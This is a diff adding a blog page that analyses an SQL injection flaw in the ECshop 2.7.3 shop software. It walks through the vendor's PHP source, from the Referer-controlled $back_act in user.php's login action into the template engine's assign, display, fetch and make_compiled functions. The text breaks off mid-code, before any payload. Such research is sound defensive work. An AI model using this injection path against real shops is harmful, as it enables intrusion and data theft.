@@ -1,0 +1,425 @@
+
+
+<!DOCTYPE html>
+<html lang="en" color-mode=light>
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>ECshop 2.7.3 SQL注入漏洞分析 - Welcome to fallingblog</title>
+  <meta name="apple-mobile-web-app-capable" content="yes" />
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="google" content="notranslate" />
+  
+  <meta name="description" content="准备工作ECshop简介ECShop是一款专业的电商商...">
+  <meta name="author" content="Ibukifalling">
+  <link rel="icon" href="/images/icons/favicon-16x16.png" type="image/png" sizes="16x16">
+  <link rel="icon" href="/images/icons/favicon-32x32.png" type="image/png" sizes="32x32">
+  <link rel="apple-touch-icon" href="/images/icons/apple-touch-icon.png" sizes="180x180">
+  <meta rel="mask-icon" href="/images/icons/stun-logo.svg" color="#333333">
+  
+    <meta rel="msapplication-TileImage" content="/images/icons/favicon-144x144.png">
+    <meta rel="msapplication-TileColor" content="#000000">
+  
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+
+  
+    
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1445822_r673sha78lq.css">
+
+  
+
+  
+    
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css">
+
+  
+
+  
+    
+      
+        
+        
+<link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.18.1/styles/xcode.min.css" name="highlight-style" mode="light">
+
+      
+        
+        
+<link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.18.1/styles/solarized-dark.min.css" name="highlight-style" mode="dark">
+
+      
+  
+
+  <script>
+    var CONFIG = window.CONFIG || {};
+    var ZHAOO = window.ZHAOO || {};
+    CONFIG = {
+      isHome: false,
+      fancybox: true,
+      pjax: false,
+      lazyload: {
+        enable: true,
+        only_post: 'false',
+        loading: '[object Object]'
+      },
+      donate: {
+        enable: true,
+        alipay: 'https://pic.izhaoo.com/alipay.jpg',
+        wechat: 'https://pic.izhaoo.com/wechat.jpg'
+      },
+      galleries: {
+        enable: true
+      },
+      fab: {
+        enable: true,
+        always_show: false
+      },
+      carrier: {
+        enable: true
+      },
+      daovoice: {
+        enable: false
+      },
+      preview: {
+        background: {
+          default: '',
+          api: ''
+        },
+        motto: {
+          default: '我在开了灯的床头下，想问问自己的心啊。',
+          typing: true,
+          api: 'https://v2.jinrishici.com/one.json',
+          data_contents: '["data","content"]'
+        },
+      },
+      qrcode: {
+        enable: true,
+        type: 'url',
+        image: 'https://pic.izhaoo.com/weapp-code.jpg',
+      },
+      toc: {
+        enable: true
+      },
+      scrollbar: {
+        type: 'default'
+      },
+      notification: {
+        enable: false,
+        delay: 4500,
+        list: '',
+        page_white_list: '',
+        page_black_list: ''
+      },
+      search: {
+        enable: false,
+        path: ''
+      }
+    }
+  </script>
+
+  
+
+  
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body class="lock-screen">
+  <div class="loading"></div>
+  
+    
+
+
+  <nav class="navbar">
+    <div class="left">
+      
+        <i class="iconfont iconhome j-navbar-back-home"></i>
+      
+      
+        <i class="iconfont iconqrcode j-navbar-qrcode"></i>
+      
+      
+        <i class="iconfont iconmoono" id="color-toggle" color-toggle="light"></i>
+      
+      
+    </div>
+    <div class="center">ECshop 2.7.3 SQL注入漏洞分析</div>
+    <div class="right">
+      <i class="iconfont iconmenu j-navbar-menu"></i>
+    </div>
+    
+      <div id="qrcode-navbar"></div>
+    
+  </nav>
+
+  
+  
+
+<nav class="menu">
+  <div class="menu-container">
+    <div class="menu-close">
+      <i class="iconfont iconbaseline-close-px"></i>
+    </div>
+    <ul class="menu-content"><li class="menu-item">
+        <a href="/ " class="underline "> 首页</a>
+      </li><li class="menu-item">
+        <a href="/galleries/ " class="underline "> 摄影</a>
+      </li><li class="menu-item">
+        <a href="/archives/ " class="underline "> 归档</a>
+      </li><li class="menu-item">
+        <a href="/tags/ " class="underline "> 标签</a>
+      </li><li class="menu-item">
+        <a href="/categories/ " class="underline "> 分类</a>
+      </li><li class="menu-item">
+        <a href="/about/ " class="underline "> 关于</a>
+      </li></ul>
+    
+      <div class="menu-copyright"><p>Powered by <a target="_blank" href="https://hexo.io">Hexo</a>  |  Theme - <a target="_blank" href="https://github.com/izhaoo/hexo-theme-zhaoo">zhaoo</a></p></div>
+    
+  </div>
+</nav>
+  <main id="main">
+  <div class="article-wrap">
+    <div class="row container">
+      <div class="col-xl-3"></div>
+      <div class="col-xl-6"><article class="article">
+  <div class="wrap">
+    <section class="head">
+  <img   class="lazyload" data-original="/images/theme/post-image.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  draggable="false">
+  <div class="head-mask">
+    <h1 class="head-title">ECshop 2.7.3 SQL注入漏洞分析</h1>
+    <div class="head-info">
+      <span class="post-info-item"><i class="iconfont iconcalendar"></i>December 16, 2021</span>
+      
+      <span class="post-info-item"><i class="iconfont iconfont-size"></i>13227</span>
+    </div>
+  </div>
+</section>
+    <section class="main">
+      <section class="content">
+        <h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><h2 id="ECshop简介"><a href="#ECshop简介" class="headerlink" title="ECshop简介"></a>ECshop简介</h2><p>ECShop是一款专业的电商商城系统, 跨平台开源程序</p>
+<p>ECShop可以快速构建PC+微商城+APP+小程序等多终端商城，并支持二次开发定制化商城</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>下载ECshop 3.6源码后解压到本地phpstudy目录下</p>
+<p><img   class="lazyload" data-original="https://md.buptmerak.cn/uploads/upload_41102e3acd78a1d8bed78aec7ca4dcec.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<p>访问localhost，进行相关配置完成安装过程</p>
+<p><img   class="lazyload" data-original="https://md.buptmerak.cn/uploads/upload_f2e727c8d9d2d892652fd51c49e0b122.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<p>安装完成后即可在本地访问</p>
+<p><img   class="lazyload" data-original="https://md.buptmerak.cn/uploads/upload_7de9ee874bc99bf7a4377c0d3a5e46f6.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>我们首先关注user.php中login部分的代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">/* 用户登录界面 */</span><br><span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$action</span> == <span class="hljs-string">&#x27;login&#x27;</span>)<br>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$back_act</span>))<br>    &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$back_act</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;_SERVER&#x27;</span>][<span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span>]))<br>        &#123;<br>            <span class="hljs-variable">$back_act</span> = strpos(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;_SERVER&#x27;</span>][<span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span>], <span class="hljs-string">&#x27;user.php&#x27;</span>) ? <span class="hljs-string">&#x27;./index.php&#x27;</span> : <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;_SERVER&#x27;</span>][<span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span>];<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            <span class="hljs-variable">$back_act</span> = <span class="hljs-string">&#x27;user.php&#x27;</span>;<br>        &#125;<br><br>    &#125;<br><br><br>    <span class="hljs-variable">$captcha</span> = intval(<span class="hljs-variable">$_CFG</span>[<span class="hljs-string">&#x27;captcha&#x27;</span>]);<br>    <span class="hljs-keyword">if</span> ((<span class="hljs-variable">$captcha</span> &amp; CAPTCHA_LOGIN) &amp;&amp; (!(<span class="hljs-variable">$captcha</span> &amp; CAPTCHA_LOGIN_FAIL) || ((<span class="hljs-variable">$captcha</span> &amp; CAPTCHA_LOGIN_FAIL) &amp;&amp; <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login_fail&#x27;</span>] &gt; <span class="hljs-number">2</span>)) &amp;&amp; gd_version() &gt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;smarty&#x27;</span>]-&gt;assign(<span class="hljs-string">&#x27;enabled_captcha&#x27;</span>, <span class="hljs-number">1</span>);<br>        <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;smarty&#x27;</span>]-&gt;assign(<span class="hljs-string">&#x27;rand&#x27;</span>, mt_rand());<br>    &#125;<br><br>    <span class="hljs-variable">$smarty</span>-&gt;assign(<span class="hljs-string">&#x27;back_act&#x27;</span>, <span class="hljs-variable">$back_act</span>);<br>    <span class="hljs-variable">$smarty</span>-&gt;display(<span class="hljs-string">&#x27;user_passport.dwt&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>注意到此处的<code>$back_act</code>参数是通过<code>$GLOBALS[&#39;_SERVER&#39;][&#39;HTTP_REFERER&#39;]</code>获取的</p>
+<p>Smarty是一个php的模板引擎，该引擎有两个基本的函数assign()、display()。assign()函数用于在模版执行时为模版变量赋值，display()函数用于显示模版。</p>
+<p>那么此处我们就可以通过修改http referer头的方式来控制<code>$back_act</code>参数，从而控制assign()函数的参数</p>
+<p>接下来我们跟进这个模板变量到/includes/cls_template.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 注册变量</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@access</span>  public</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span>   mix      $tpl_var</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span>   mix      $value</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@return</span>  void</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">assign</span>(<span class="hljs-params"><span class="hljs-variable">$tpl_var</span>, <span class="hljs-variable">$value</span> = <span class="hljs-string">&#x27;&#x27;</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (is_array(<span class="hljs-variable">$tpl_var</span>))<br>    &#123;<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$tpl_var</span> <span class="hljs-keyword">AS</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$val</span>)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$key</span> != <span class="hljs-string">&#x27;&#x27;</span>)<br>            &#123;<br>                <span class="hljs-keyword">$this</span>-&gt;_var[<span class="hljs-variable">$key</span>] = <span class="hljs-variable">$val</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$tpl_var</span> != <span class="hljs-string">&#x27;&#x27;</span>)<br>        &#123;<br>            <span class="hljs-keyword">$this</span>-&gt;_var[<span class="hljs-variable">$tpl_var</span>] = <span class="hljs-variable">$value</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>因为<code>$back_act</code>不是数组，所以进入else分支，被赋给<code>$this-&gt;_var[$back_act]</code></p>
+<p>继续查看display()函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">/**</span><br><span class="hljs-comment">    * 显示页面函数</span><br><span class="hljs-comment">    *</span><br><span class="hljs-comment">    * <span class="hljs-doctag">@access</span>  public</span><br><span class="hljs-comment">    * <span class="hljs-doctag">@param</span>   string      $filename</span><br><span class="hljs-comment">    * <span class="hljs-doctag">@param</span>   sting      $cache_id</span><br><span class="hljs-comment">    *</span><br><span class="hljs-comment">    * <span class="hljs-doctag">@return</span>  void</span><br><span class="hljs-comment">    */</span><br>   <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">display</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span>, <span class="hljs-variable">$cache_id</span> = <span class="hljs-string">&#x27;&#x27;</span></span>)</span><br><span class="hljs-function">   </span>&#123;<br>       <span class="hljs-keyword">$this</span>-&gt;_seterror++;<br>       error_reporting(E_ALL ^ E_NOTICE);<br><br>       <span class="hljs-keyword">$this</span>-&gt;_checkfile = <span class="hljs-literal">false</span>;<br>       <span class="hljs-variable">$out</span> = <span class="hljs-keyword">$this</span>-&gt;fetch(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$cache_id</span>);<br><br>       <span class="hljs-keyword">if</span> (strpos(<span class="hljs-variable">$out</span>, <span class="hljs-keyword">$this</span>-&gt;_echash) !== <span class="hljs-literal">false</span>)<br>       &#123;<br>           <span class="hljs-variable">$k</span> = explode(<span class="hljs-keyword">$this</span>-&gt;_echash, <span class="hljs-variable">$out</span>);<br>           <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$k</span> <span class="hljs-keyword">AS</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$val</span>)<br>           &#123;<br>               <span class="hljs-keyword">if</span> ((<span class="hljs-variable">$key</span> % <span class="hljs-number">2</span>) == <span class="hljs-number">1</span>)<br>               &#123;<br>                   <span class="hljs-variable">$k</span>[<span class="hljs-variable">$key</span>] = <span class="hljs-keyword">$this</span>-&gt;insert_mod(<span class="hljs-variable">$val</span>);<br>               &#125;<br>           &#125;<br>           <span class="hljs-variable">$out</span> = implode(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$k</span>);<br>       &#125;<br>       error_reporting(<span class="hljs-keyword">$this</span>-&gt;_errorlevel);<br>       <span class="hljs-keyword">$this</span>-&gt;_seterror--;<br><br>       <span class="hljs-keyword">echo</span> <span class="hljs-variable">$out</span>;<br>   &#125;<br></code></pre></td></tr></table></figure>
+
+<p>此处调用display()函数时，传入的<code>$filename</code>参数值为<code>&#39;user_passport.dwt&#39;</code>，会使用fetch方法来处理该模板文件</p>
+<p>跟进fetch方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 处理模板文件</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@access</span>  public</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span>   string      $filename</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span>   sting      $cache_id</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span>  sring</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fetch</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span>, <span class="hljs-variable">$cache_id</span> = <span class="hljs-string">&#x27;&#x27;</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">$this</span>-&gt;_seterror)<br>        &#123;<br>            error_reporting(E_ALL ^ E_NOTICE);<br>        &#125;<br>        <span class="hljs-keyword">$this</span>-&gt;_seterror++;<br><br>        <span class="hljs-keyword">if</span> (strncmp(<span class="hljs-variable">$filename</span>,<span class="hljs-string">&#x27;str:&#x27;</span>, <span class="hljs-number">4</span>) == <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-variable">$out</span> = <span class="hljs-keyword">$this</span>-&gt;_eval(<span class="hljs-keyword">$this</span>-&gt;fetch_str(substr(<span class="hljs-variable">$filename</span>, <span class="hljs-number">4</span>)));<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;_checkfile)<br>            &#123;<br>                <span class="hljs-keyword">if</span> (!file_exists(<span class="hljs-variable">$filename</span>))<br>                &#123;<br>                    <span class="hljs-variable">$filename</span> = <span class="hljs-keyword">$this</span>-&gt;template_dir . <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$filename</span>;<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">else</span><br>            &#123;<br>                <span class="hljs-variable">$filename</span> = <span class="hljs-keyword">$this</span>-&gt;template_dir . <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$filename</span>;<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;direct_output)<br>            &#123;<br>                <span class="hljs-keyword">$this</span>-&gt;_current_file = <span class="hljs-variable">$filename</span>;<br><br>                <span class="hljs-variable">$out</span> = <span class="hljs-keyword">$this</span>-&gt;_eval(<span class="hljs-keyword">$this</span>-&gt;fetch_str(file_get_contents(<span class="hljs-variable">$filename</span>)));<br>            &#125;<br>            <span class="hljs-keyword">else</span><br>            &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$cache_id</span> &amp;&amp; <span class="hljs-keyword">$this</span>-&gt;caching)<br>                &#123;<br>                    <span class="hljs-variable">$out</span> = <span class="hljs-keyword">$this</span>-&gt;template_out;<br>                &#125;<br>                <span class="hljs-keyword">else</span><br>                &#123;<br>                    <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$filename</span>, <span class="hljs-keyword">$this</span>-&gt;template))<br>                    &#123;<br>                        <span class="hljs-keyword">$this</span>-&gt;template[] = <span class="hljs-variable">$filename</span>;<br>                    &#125;<br><br>                    <span class="hljs-variable">$out</span> = <span class="hljs-keyword">$this</span>-&gt;make_compiled(<span class="hljs-variable">$filename</span>);<br><br>                    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$cache_id</span>)<br>                    &#123;<br>                        <span class="hljs-variable">$cachename</span> = basename(<span class="hljs-variable">$filename</span>, strrchr(<span class="hljs-variable">$filename</span>, <span class="hljs-string">&#x27;.&#x27;</span>)) . <span class="hljs-string">&#x27;_&#x27;</span> . <span class="hljs-variable">$cache_id</span>;<br>                        <span class="hljs-variable">$data</span> = serialize(<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;template&#x27;</span> =&gt; <span class="hljs-keyword">$this</span>-&gt;template, <span class="hljs-string">&#x27;expires&#x27;</span> =&gt; <span class="hljs-keyword">$this</span>-&gt;_nowtime + <span class="hljs-keyword">$this</span>-&gt;cache_lifetime, <span class="hljs-string">&#x27;maketime&#x27;</span> =&gt; <span class="hljs-keyword">$this</span>-&gt;_nowtime));<br>                        <span class="hljs-variable">$out</span> = str_replace(<span class="hljs-string">&quot;\r&quot;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$out</span>);<br><br>                        <span class="hljs-keyword">while</span> (strpos(<span class="hljs-variable">$out</span>, <span class="hljs-string">&quot;\n\n&quot;</span>) !== <span class="hljs-literal">false</span>)<br>                        &#123;<br>                            <span class="hljs-variable">$out</span> = str_replace(<span class="hljs-string">&quot;\n\n&quot;</span>, <span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-variable">$out</span>);<br>                        &#125;<br><br>                        <span class="hljs-variable">$hash_dir</span> = <span class="hljs-keyword">$this</span>-&gt;cache_dir . <span class="hljs-string">&#x27;/&#x27;</span> . substr(md5(<span class="hljs-variable">$cachename</span>), <span class="hljs-number">0</span>, <span class="hljs-number">1</span>);<br>                        <span class="hljs-keyword">if</span> (!is_dir(<span class="hljs-variable">$hash_dir</span>))<br>                        &#123;<br>                            mkdir(<span class="hljs-variable">$hash_dir</span>);<br>                        &#125;<br>                        <span class="hljs-keyword">if</span> (file_put_contents(<span class="hljs-variable">$hash_dir</span> . <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$cachename</span> . <span class="hljs-string">&#x27;.php&#x27;</span>, <span class="hljs-string">&#x27;&lt;?php exit;?&gt;&#x27;</span> . <span class="hljs-variable">$data</span> . <span class="hljs-variable">$out</span>, LOCK_EX) === <span class="hljs-literal">false</span>)<br>                        &#123;<br>                            trigger_error(<span class="hljs-string">&#x27;can\&#x27;t write:&#x27;</span> . <span class="hljs-variable">$hash_dir</span> . <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$cachename</span> . <span class="hljs-string">&#x27;.php&#x27;</span>);<br>                        &#125;<br>                        <span class="hljs-keyword">$this</span>-&gt;template = <span class="hljs-keyword">array</span>();<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">$this</span>-&gt;_seterror--;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">$this</span>-&gt;_seterror)<br>        &#123;<br>            error_reporting(<span class="hljs-keyword">$this</span>-&gt;_errorlevel);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$out</span>; <span class="hljs-comment">// 返回html数据</span><br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<p>发现make_complied方法，继续跟进</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">/**</span><br><span class="hljs-comment">    * 编译模板函数</span><br><span class="hljs-comment">    *</span><br><span class="hljs-comment">    * <span class="hljs-doctag">@access</span>  public</span><br><span class="hljs-comment">    * <span class="hljs-doctag">@param</span>   string      $filename</span><br><span class="hljs-comment">    *</span><br><span class="hljs-comment">    * <span class="hljs-doctag">@return</span>  sring        编译后文件地址</span><br><span class="hljs-comment">    */</span><br>   <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">make_compiled</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span></span>)</span><br><span class="hljs-function">   </span>&#123;<br>       <span class="hljs-variable">$name</span> = <span class="hljs-keyword">$this</span>-&gt;compile_dir . <span class="hljs-string">&#x27;/&#x27;</span> . basename(<span class="hljs-variable">$filename</span>) . <span class="hljs-string">&#x27;.php&#x27;</span>;<br>       <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;_expires)<br>       &#123;<br>           <span class="hljs-variable">$expires</span> = <span class="hljs-keyword">$this</span>-&gt;_expires - <span class="hljs-keyword">$this</span>-&gt;cache_lifetime;<br>       &#125;<br>       <span class="hljs-keyword">else</span><br>       &#123;<br>           <span class="hljs-variable">$filestat</span> = @stat(<span class="hljs-variable">$name</span>);<br>           <span class="hljs-variable">$expires</span>  = <span class="hljs-variable">$filestat</span>[<span class="hljs-string">&#x27;mtime&#x27;</span>];<br>       &#125;<br><br>       <span class="hljs-variable">$filestat</span> = @stat(<span class="hljs-variable">$filename</span>);<br><br>       <span class="hljs-keyword">if</span> (<span class="hljs-variable">$filestat</span>[<span class="hljs-string">&#x27;mtime&#x27;</span>] &lt;= <span class="hljs-variable">$expires</span> &amp;&amp; !<span class="hljs-keyword">$this</span>-&gt;force_compile)<br>       &#123;<br>           <span class="hljs-keyword">if</span> (file_exists(<span class="hljs-variable">$name</span>))<br>           &#123;<br>               <span class="hljs-variable">$source</span> = <span class="hljs-keyword">$this</span>-&gt;_require(<span class="hljs-variable">$name</span>);<br>               <span class="hljs-keyword">if</span> (<span class="hljs-variable">$source</span> == <span class="hljs-string">&#x27;&#x27;</span>)<br>               &#123;<br>                   <span class="hljs-variable">$expires</span> = <span class="hljs-number">0</span>;<br>               &#125;<br>           &#125;<br>           <span 